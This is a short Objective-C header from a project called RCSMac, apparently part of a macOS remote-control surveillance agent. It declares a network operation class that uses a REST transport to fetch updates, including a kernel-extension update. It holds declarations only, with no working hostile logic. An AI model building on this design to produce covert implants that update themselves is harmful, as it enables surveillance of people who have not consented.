/*
 *  UpgradeNetworkOperation.h
 *  RCSMac
 *
 *
 *  Created by revenge on 2/3/11.
 *  Copyright (C) HT srl 2011. All rights reserved
 *
 */

//#import <Cocoa/Cocoa.h>
#import "NetworkOperation.h"
#import "RESTTransport.h"

#define KEXT_UPGRADE  @"kext-update"


@interface UpgradeNetworkOperation : NSObject <NetworkOperation>
{
@private
  RESTTransport *mTransport;
}

- (id)initWithTransport: (RESTTransport *)aTransport;
- (void)dealloc;

@end